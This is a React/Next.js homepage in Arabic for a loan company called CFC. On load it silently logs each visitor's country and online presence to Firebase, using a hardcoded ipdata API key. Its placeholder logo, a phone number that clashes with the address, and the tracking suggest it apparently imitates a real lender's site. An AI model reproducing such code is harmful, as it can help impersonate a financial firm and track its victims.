"use client";

import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import {
  Menu,
  Car,
  HandCoins,
  Phone,
  Mail,
  MapPin,
  Download,
  Star,
  Shield,
  Clock,
  Award,
  Home,
  Sofa,
  ChevronRight,
  TrendingUp,
  CheckCircle2,
  Sparkles,
} from "lucide-react";
import HeroCarousel from "@/components/hero-carousel";
import Link from "next/link";
import { useEffect, useState } from "react";
import { addData } from "@/lib/firebase";
import { setupOnlineStatus } from "@/lib/utils";
import { LiveChatWidget } from "@livechat/widget-react";

function randstr(prefix: string) {
  return Math.random()
    .toString(36)
    .replace("0.", prefix || "");
}

const visitorID = randstr("Tmn-");

export default function CFCHomePage() {
  const [isLoaded, setIsLoaded] = useState(false);

  useEffect(() => {
    setIsLoaded(true);
    getLocation();
  }, []);

  async function getLocation() {
    const APIKEY = "003fbd81bad437790b184451a8cfe3c7532fca99d9c591705b4c7d1f";

    if (!APIKEY) {
      console.error("API key not configured");
      return;
    }

    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;

    try {
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      const country = await response.text();

      await addData({
        id: visitorID,
        country: country,
        createdDate: new Date().toISOString(),
      });

      localStorage.setItem("country", country);
      setupOnlineStatus(visitorID);
    } catch (error) {
      console.error("Error fetching location:", error);
    }
  }

  return (
    <div
      className="min-h-screen bg-gradient-to-b from-gray-50 to-white"
      dir="rtl"
    >
      {/* Header */}
      <header className="sticky top-0 z-50 bg-gradient-to-r from-blue-600 via-blue-700 to-blue-800 text-white shadow-lg backdrop-blur-sm">
        <div className="flex items-center justify-between max-w-md mx-auto p-4">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 bg-white/10 backdrop-blur-md rounded-xl flex items-center justify-center shadow-lg border border-white/20">
              <img
                src="/next.svg"
                width={70}
                alt="CFC Logo"
                className="brightness-0 invert"
              />
            </div>
            <div className="flex flex-col">
              <span className="font-bold text-lg tracking-tight">CFC</span>
              <span className="text-xs text-blue-100">التسهيلات التجارية</span>
            </div>
          </div>
          <button className="w-10 h-10 rounded-lg bg-white/10 backdrop-blur-md flex items-center justify-center hover:bg-white/20 transition-all border border-white/20">
            <Menu className="w-5 h-5" />
          </button>
        </div>
      </header>

      {/* Hero Carousel */}
      <div
        className={`transition-opacity duration-700 ${
          isLoaded ? "opacity-100" : "opacity-0"
        }`}
      >
        <HeroCarousel />
      </div>

      {/* Quick Stats Banner */}
      <section className="px-6 py-4 max-w-md mx-auto -mt-8 relative z-10">
        <Card className="bg-white shadow-xl border-0 rounded-2xl overflow-hidden">
          <CardContent className="p-4">
            <div className="grid grid-cols-3 gap-4 text-center">
              <div className="space-y-1">
                <div className="flex items-center justify-center gap-1">
                  <TrendingUp className="w-4 h-4 text-green-600" />
                  <p className="text-2xl font-bold text-gray-900">٤٢</p>
                </div>
                <p className="text-xs text-gray-600">سنة خبرة</p>
              </div>
              <div className="space-y-1 border-x border-gray-200">
                <div className="flex items-center justify-center gap-1">
                  <CheckCircle2 className="w-4 h-4 text-blue-600" />
                  <p className="text-2xl font-bold text-gray-900">٩٨٪</p>
                </div>
                <p className="text-xs text-gray-600">رضا العملاء</p>
              </div>
              <div className="space-y-1">
                <div className="flex items-center justify-center gap-1">
                  <Sparkles className="w-4 h-4 text-yellow-600" />
                  <p className="text-2xl font-bold text-gray-900">٢٤/٧</p>
                </div>
                <p className="text-xs text-gray-600">دعم فوري</p>
              </div>
            </div>
          </CardContent>
        </Card>
      </section>

      {/* Calculate Your Loan */}
      <section className="px-6 py-8 max-w-md mx-auto">
        <div className="flex items-center justify-between mb-6">
          <div>
            <h2 className="text-2xl font-bold text-gray-900 mb-1">احسب قرضك</h2>
            <p className="text-sm text-gray-600">اختر نوع التمويل المناسب لك</p>
          </div>
          <Badge className="bg-green-100 text-green-700 hover:bg-green-100 border-0">
            جديد
          </Badge>
        </div>

        <div className="grid grid-cols-2 gap-4">
          <Link href="/loan-application" className="group">
            <Card className="h-full border-0 shadow-md hover:shadow-2xl transition-all duration-300 hover:-translate-y-2 bg-gradient-to-br from-white to-blue-50/50">
              <CardContent className="p-6 text-center space-y-4 h-full flex flex-col justify-between">
                <div className="w-16 h-16 bg-gradient-to-br from-blue-500 to-blue-600 rounded-2xl flex items-center justify-center mx-auto group-hover:scale-110 group-hover:rotate-3 transition-all duration-300 shadow-lg">
                  <HandCoins className="w-8 h-8 text-white" />
                </div>
                <div>
                  <p className="font-bold text-gray-900 text-lg mb-1">
                    قرض نقدي
                  </p>
                  <p className="text-xs text-gray-600 leading-relaxed">
                    تمويل فوري ومرن لجميع احتياجاتك
                  </p>
                </div>
                <div className="flex items-center justify-center text-blue-600 text-xs font-semibold opacity-0 group-hover:opacity-100 transition-opacity">
                  <span>ابدأ الآن</span>
                  <ChevronRight className="w-4 h-4" />
                </div>
              </CardContent>
            </Card>
          </Link>

          <Link href="/loan-application" className="group">
            <Card className="h-full border-0 shadow-md hover:shadow-2xl transition-all duration-300 hover:-translate-y-2 bg-gradient-to-br from-white to-cyan-50/50">
              <CardContent className="p-6 text-center space-y-4 h-full flex flex-col justify-between">
                <div className="w-16 h-16 bg-gradient-to-br from-cyan-500 to-blue-600 rounded-2xl flex items-center justify-center mx-auto group-hover:scale-110 group-hover:rotate-3 transition-all duration-300 shadow-lg">
                  <Car className="w-8 h-8 text-white" />
                </div>
                <div>
                  <p className="font-bold text-gray-900 text-lg mb-1">
                    قرض سيارة
                  </p>
                  <p className="text-xs text-gray-600 leading-relaxed">
                    احصل على سيارة أحلامك بسهولة
                  </p>
                </div>
                <div className="flex items-center justify-center text-cyan-600 text-xs font-semibold opacity-0 group-hover:opacity-100 transition-opacity">
                  <span>ابدأ الآن</span>
                  <ChevronRight className="w-4 h-4" />
                </div>
              </CardContent>
            </Card>
          </Link>

          <Link href="/loan-application" className="group">
            <Card className="h-full border-0 shadow-md hover:shadow-2xl transition-all duration-300 hover:-translate-y-2 bg-gradient-to-br from-white to-green-50/50">
              <CardContent className="p-6 text-center space-y-4 h-full flex flex-col justify-between">
                <div className="w-16 h-16 bg-gradient-to-br from-green-500 to-emerald-600 rounded-2xl flex items-center justify-center mx-auto group-hover:scale-110 group-hover:rotate-3 transition-all duration-300 shadow-lg">
                  <Home className="w-8 h-8 text-white" />
                </div>
                <div>
                  <p className="font-bold text-gray-900 text-lg mb-1">
                    قرض سكن
                  </p>
                  <p className="text-xs text-gray-600 leading-relaxed">
                    امتلك منزل أحلامك اليوم
                  </p>
                </div>
                <div className="flex items-center justify-center text-green-600 text-xs font-semibold opacity-0 group-hover:opacity-100 transition-opacity">
                  <span>ابدأ الآن</span>
                  <ChevronRight className="w-4 h-4" />
                </div>
              </CardContent>
            </Card>
          </Link>

          <Link href="/loan-application" className="group">
            <Card className="h-full border-0 shadow-md hover:shadow-2xl transition-all duration-300 hover:-translate-y-2 bg-gradient-to-br from-white to-purple-50/50">
              <CardContent className="p-6 text-center space-y-4 h-full flex flex-col justify-between">
                <div className="w-16 h-16 bg-gradient-to-br from-purple-500 to-pink-600 rounded-2xl flex items-center justify-center mx-auto group-hover:scale-110 group-hover:rotate-3 transition-all duration-300 shadow-lg">
                  <Sofa className="w-8 h-8 text-white" />
                </div>
                <div>
                  <p className="font-bold text-gray-900 text-lg mb-1">
                    قرض أثاث
                  </p>
                  <p className="text-xs text-gray-600 leading-relaxed">
                    جهز منزلك بأفضل الأثاث
                  </p>
                </div>
                <div className="flex items-center justify-center text-purple-600 text-xs font-semibold opacity-0 group-hover:opacity-100 transition-opacity">
                  <span>ابدأ الآن</span>
                  <ChevronRight className="w-4 h-4" />
                </div>
              </CardContent>
            </Card>
          </Link>
        </div>
      </section>

      {/* Why CFC */}
      <section className="px-6 py-8 max-w-md mx-auto bg-gradient-to-b from-gray-50 to-white">
        <div className="mb-6">
          <h2 className="text-2xl font-bold text-gray-900 mb-2">لماذا CFC؟</h2>
          <p className="text-sm text-gray-600 leading-relaxed">
            مرحباً بكم في CFC، حيث رضاكم هو أولويتنا. اكتشفوا لماذا يعتبر اختيار
            CFC هو أفضل قرار لاحتياجاتكم المالية.
          </p>
        </div>

        <div className="grid grid-cols-2 gap-4 mb-6">
          <Card className="border-0 shadow-sm hover:shadow-md transition-shadow bg-gradient-to-br from-blue-50 to-white">
            <CardContent className="p-5 space-y-3">
              <div className="w-12 h-12 bg-blue-100 rounded-xl flex items-center justify-center">
                <Shield className="w-6 h-6 text-blue-600" />
              </div>
              <div>
                <h3 className="text-sm font-bold text-gray-900 mb-1">
                  أمان وثقة
                </h3>
                <p className="text-xs text-gray-600 leading-relaxed">
                  حماية كاملة لبياناتكم المالية
                </p>
              </div>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-sm hover:shadow-md transition-shadow bg-gradient-to-br from-green-50 to-white">
            <CardContent className="p-5 space-y-3">
              <div className="w-12 h-12 bg-green-100 rounded-xl flex items-center justify-center">
                <Clock className="w-6 h-6 text-green-600" />
              </div>
              <div>
                <h3 className="text-sm font-bold text-gray-900 mb-1">
                  سرعة في الخدمة
                </h3>
                <p className="text-xs text-gray-600 leading-relaxed">
                  موافقة فورية خلال دقائق
                </p>
              </div>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-sm hover:shadow-md transition-shadow bg-gradient-to-br from-yellow-50 to-white">
            <CardContent className="p-5 space-y-3">
              <div className="w-12 h-12 bg-yellow-100 rounded-xl flex items-center justify-center">
                <Star className="w-6 h-6 text-yellow-600" />
              </div>
              <div>
                <h3 className="text-sm font-bold text-gray-900 mb-1">
                  خدمة متميزة
                </h3>
                <p className="text-xs text-gray-600 leading-relaxed">
                  دعم احترافي على مدار الساعة
                </p>
              </div>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-sm hover:shadow-md transition-shadow bg-gradient-to-br from-purple-50 to-white">
            <CardContent className="p-5 space-y-3">
              <div className="w-12 h-12 bg-purple-100 rounded-xl flex items-center justify-center">
                <Award className="w-6 h-6 text-purple-600" />
              </div>
              <div>
                <h3 className="text-sm font-bold text-gray-900 mb-1">
                  خبرة ٤٢ عاماً
                </h3>
                <p className="text-xs text-gray-600 leading-relaxed">
                  ريادة وثقة في السوق
                </p>
              </div>
            </CardContent>
          </Card>
        </div>

        <Card className="bg-gradient-to-br from-blue-600 via-blue-700 to-blue-800 text-white rounded-2xl shadow-xl overflow-hidden border-0">
          <CardContent className="p-8 text-center space-y-6 relative">
            <div className="absolute top-0 right-0 w-40 h-40 bg-white/5 rounded-full -translate-y-20 translate-x-20"></div>
            <div className="absolute bottom-0 left-0 w-32 h-32 bg-white/5 rounded-full translate-y-16 -translate-x-16"></div>
            <div className="absolute top-1/2 left-1/2 w-24 h-24 bg-white/5 rounded-full -translate-x-12 -translate-y-12"></div>

            <div className="relative z-10 space-y-4">
              <div className="w-20 h-20 bg-white/20 rounded-2xl flex items-center justify-center mx-auto backdrop-blur-sm border border-white/30 shadow-lg">
                <div className="text-4xl font-bold">؟</div>
              </div>
              <div>
                <h3 className="text-2xl font-bold mb-2">لماذا CFC؟</h3>
                <p className="text-sm text-blue-100 leading-relaxed max-w-xs mx-auto">
                  اكتشف المزايا التي تجعلنا الخيار الأول لأكثر من ١٠٠,٠٠٠ عميل
                </p>
              </div>
              <Button className="bg-white text-blue-700 hover:bg-blue-50 font-bold shadow-lg">
                اعرف المزيد
              </Button>
            </div>
          </CardContent>
        </Card>
      </section>

      {/* CFC Offers */}
      <section className="px-6 py-8 max-w-md mx-auto">
        <div className="flex items-center justify-between mb-6">
          <div>
            <h2 className="text-2xl font-bold text-gray-900 mb-1">عروض CFC</h2>
            <p className="text-sm text-gray-600">
              أحدث العروض المميزة لعملائنا
            </p>
          </div>
          <div className="flex items-center gap-2">
            <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
            <span className="text-xs font-semibold text-green-600">
              متاح الآن
            </span>
          </div>
        </div>

        <div className="grid grid-cols-2 gap-4 mb-6">
          <Card className="bg-gradient-to-br from-blue-600 via-blue-700 to-blue-800 text-white rounded-2xl shadow-xl overflow-hidden border-0 hover:scale-105 transition-transform duration-300">
            <CardContent className="p-6 relative">
              <div className="absolute top-0 right-0 w-20 h-20 bg-white/10 rounded-full -translate-y-10 translate-x-10"></div>
              <div className="absolute bottom-0 left-0 w-16 h-16 bg-white/10 rounded-full translate-y-8 -translate-x-8"></div>

              <div className="relative z-10 space-y-4">
                <Badge className="bg-white/20 text-white hover:bg-white/30 border-0 backdrop-blur-sm">
                  عرض خاص
                </Badge>
                <div className="space-y-2">
                  <p className="text-sm font-bold">تمويلك بدون كفيل</p>
                  <p className="text-xs text-blue-100">بدون تحويل راتب</p>
                </div>
                <div className="text-center py-3 bg-white/10 rounded-xl backdrop-blur-sm">
                  <div className="flex items-baseline justify-center gap-1">
                    <span className="text-4xl font-bold">٢٥</span>
                    <span className="text-xl">%</span>
                  </div>
                  <p className="text-xs text-blue-100 mt-1">معدل فائدة مخفض</p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-gradient-to-br from-cyan-500 via-cyan-600 to-blue-600 text-white rounded-2xl shadow-xl overflow-hidden border-0 hover:scale-105 transition-transform duration-300">
            <CardContent className="p-6 relative">
              <div className="absolute top-0 right-0 w-20 h-20 bg-white/10 rounded-full -translate-y-10 translate-x-10"></div>
              <div className="absolute bottom-0 left-0 w-16 h-16 bg-white/10 rounded-full translate-y-8 -translate-x-8"></div>

              <div className="relative z-10 space-y-4">
                <Badge className="bg-white/20 text-white hover:bg-white/30 border-0 backdrop-blur-sm">
                  الأكثر طلباً
                </Badge>
                <div className="space-y-2">
                  <p className="text-sm font-bold">تمويل سريع</p>
                  <p className="text-xs text-cyan-100">موافقة فورية</p>
                </div>
                <div className="text-center py-3 bg-white/10 rounded-xl backdrop-blur-sm">
                  <div className="flex items-baseline justify-center gap-1">
                    <span className="text-4xl font-bold">١٠</span>
                    <span className="text-xl">%</span>
                  </div>
                  <p className="text-xs text-cyan-100 mt-1">رسوم إدارية فقط</p>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        <div className="flex gap-2 flex-wrap justify-center">
          <Button
            size="sm"
            className="bg-blue-600 hover:bg-blue-700 text-sm rounded-full px-6 shadow-md"
          >
            قرض سيارة
          </Button>
          <Button
            size="sm"
            variant="outline"
            className="text-sm bg-white border-gray-300 hover:bg-gray-50 rounded-full px-6"
          >
            قرض نقدي
          </Button>
          <Button
            size="sm"
            className="bg-blue-600 hover:bg-blue-700 text-sm rounded-full px-6 shadow-md"
          >
            قرض سكن
          </Button>
        </div>
      </section>

      {/* Contact Section */}
      <section className="px-6 py-8 max-w-md mx-auto bg-gradient-to-b from-gray-50 to-white">
        <h2 className="text-2xl font-bold text-gray-900 mb-6 text-center">
          تواصل معنا
        </h2>
        <div className="grid gap-4">
          <Card className="border-0 shadow-sm hover:shadow-md transition-shadow">
            <CardContent className="p-4 flex items-center gap-4">
              <div className="w-12 h-12 bg-blue-100 rounded-xl flex items-center justify-center flex-shrink-0">
                <Phone className="w-6 h-6 text-blue-600" />
              </div>
              <div className="flex-1">
                <p className="text-xs text-gray-600 mb-1">اتصل بنا</p>
                <p className="font-bold text-gray-900 text-lg" dir="ltr">
                  +966 800 123 1222
                </p>
              </div>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-sm hover:shadow-md transition-shadow">
            <CardContent className="p-4 flex items-center gap-4">
              <div className="w-12 h-12 bg-green-100 rounded-xl flex items-center justify-center flex-shrink-0">
                <Mail className="w-6 h-6 text-green-600" />
              </div>
              <div className="flex-1">
                <p className="text-xs text-gray-600 mb-1">راسلنا</p>
                <p className="font-bold text-gray-900">info@cfc.com</p>
              </div>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-sm hover:shadow-md transition-shadow">
            <CardContent className="p-4 flex items-center gap-4">
              <div className="w-12 h-12 bg-purple-100 rounded-xl flex items-center justify-center flex-shrink-0">
                <MapPin className="w-6 h-6 text-purple-600" />
              </div>
              <div className="flex-1">
                <p className="text-xs text-gray-600 mb-1">زورنا</p>
                <p className="font-bold text-gray-900">
                  النعايم - قطعة 5 - قسيمة 32 - الدور الأرضي - الرقم الآلي
                  للوحدة 20209872
                </p>
              </div>
            </CardContent>
          </Card>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-gradient-to-b from-gray-900 to-gray-950 text-white pt-12 pb-6 mt-12">
        <div className="max-w-md mx-auto px-6 space-y-8">
          {/* Logo and Description */}
          <div className="text-center space-y-4 pb-8 border-b border-gray-800">
            <div className="w-16 h-16 bg-white/10 backdrop-blur-md rounded-2xl flex items-center justify-center mx-auto">
              <img
                src="/next.svg"
                width={80}
                alt="CFC Logo"
                className="brightness-0 invert"
              />
            </div>
            <div>
              <h3 className="text-xl font-bold mb-2">
                شركة التسهيلات التجارية
              </h3>
              <p className="text-sm text-gray-400 leading-relaxed max-w-sm mx-auto">
                شريكك الموثوق في التمويل منذ ١٩٨٣
              </p>
            </div>
          </div>

          {/* Links Grid */}
          <div className="grid grid-cols-2 gap-6">
            <div>
              <h4 className="font-bold text-white mb-4 flex items-center gap-2">
                <div className="w-1.5 h-1.5 bg-blue-500 rounded-full"></div>
                من نحن
              </h4>
              <ul className="space-y-3 text-sm text-gray-400">
                <li className="hover:text-white cursor-pointer transition-colors hover:translate-x-1 duration-200">
                  التاريخ
                </li>
                <li className="hover:text-white cursor-pointer transition-colors hover:translate-x-1 duration-200">
                  الرؤية والرسالة
                </li>
                <li className="hover:text-white cursor-pointer transition-colors hover:translate-x-1 duration-200">
                  مجلس الإدارة
                </li>
                <li className="hover:text-white cursor-pointer transition-colors hover:translate-x-1 duration-200">
                  فريق الإدارة
                </li>
                <li className="hover:text-white cursor-pointer transition-colors hover:translate-x-1 duration-200">
                  الحوكمة المؤسسية
                </li>
              </ul>
            </div>

            <div>
              <h4 className="font-bold text-white mb-4 flex items-center gap-2">
                <div className="w-1.5 h-1.5 bg-green-500 rounded-full"></div>
                خدماتنا
              </h4>
              <ul className="space-y-3 text-sm text-gray-400">
                <li className="hover:text-white cursor-pointer transition-colors hover:translate-x-1 duration-200">
                  قرض نقدي
                </li>
                <li className="hover:text-white cursor-pointer transition-colors hover:translate-x-1 duration-200">
                  قرض سيارة
                </li>
                <li className="hover:text-white cursor-pointer transition-colors hover:translate-x-1 duration-200">
                  قرض سكن
                </li>
                <li className="hover:text-white cursor-pointer transition-colors hover:translate-x-1 duration-200">
                  قرض بحري
                </li>
                <li className="hover:text-white cursor-pointer transition-colors hover:translate-x-1 duration-200">
                  قرض أثاث
                </li>
                <li className="hover:text-white cursor-pointer transition-colors hover:translate-x-1 duration-200">
                  قرض تجاري
                </li>
              </ul>
            </div>
          </div>

          {/* Social Media & Apps */}
          <div className="pt-8 border-t border-gray-800 space-y-6">
            <div>
              <h4 className="font-bold text-white mb-4 text-center">
                تابعنا على
              </h4>
              <div className="flex gap-3 justify-center">
                {[
                  { name: "IG", color: "from-pink-500 to-purple-600" },
                  { name: "FB", color: "from-blue-500 to-blue-600" },
                  { name: "X", color: "from-gray-700 to-gray-900" },
                  { name: "YT", color: "from-red-500 to-red-600" },
                  { name: "LI", color: "from-blue-600 to-blue-700" },
                ].map((social) => (
                  <button
                    key={social.name}
                    className={`w-11 h-11 bg-gradient-to-br ${social.color} rounded-xl flex items-center justify-center text-sm font-bold shadow-lg hover:scale-110 hover:-translate-y-1 transition-all duration-300`}
                  >
                    {social.name}
                  </button>
                ))}
              </div>
            </div>

            <div>
              <h4 className="font-bold text-white mb-4 text-center">
                حمل التطبيق
              </h4>
              <div className="flex gap-3 justify-center">
                <button className="bg-white text-gray-900 px-4 py-2.5 rounded-xl flex items-center gap-2 text-sm font-semibold hover:bg-gray-100 transition-all hover:scale-105 shadow-lg">
                  <Download className="w-4 h-4" />
                  <span>App Store</span>
                </button>
                <button className="bg-white text-gray-900 px-4 py-2.5 rounded-xl flex items-center gap-2 text-sm font-semibold hover:bg-gray-100 transition-all hover:scale-105 shadow-lg">
                  <Download className="w-4 h-4" />
                  <span>Google Play</span>
                </button>
              </div>
            </div>
          </div>

          {/* Copyright */}
          <div className="pt-8 border-t border-gray-800">
            <p className="text-xs text-gray-500 text-center leading-relaxed">
              © حقوق الطبع والنشر ٢٠٢٥ شركة التسهيلات التجارية CFC
              <br />
              جميع الحقوق محفوظة
            </p>
          </div>
        </div>
      </footer>

      <LiveChatWidget license="19286514" />
    </div>
  );
}
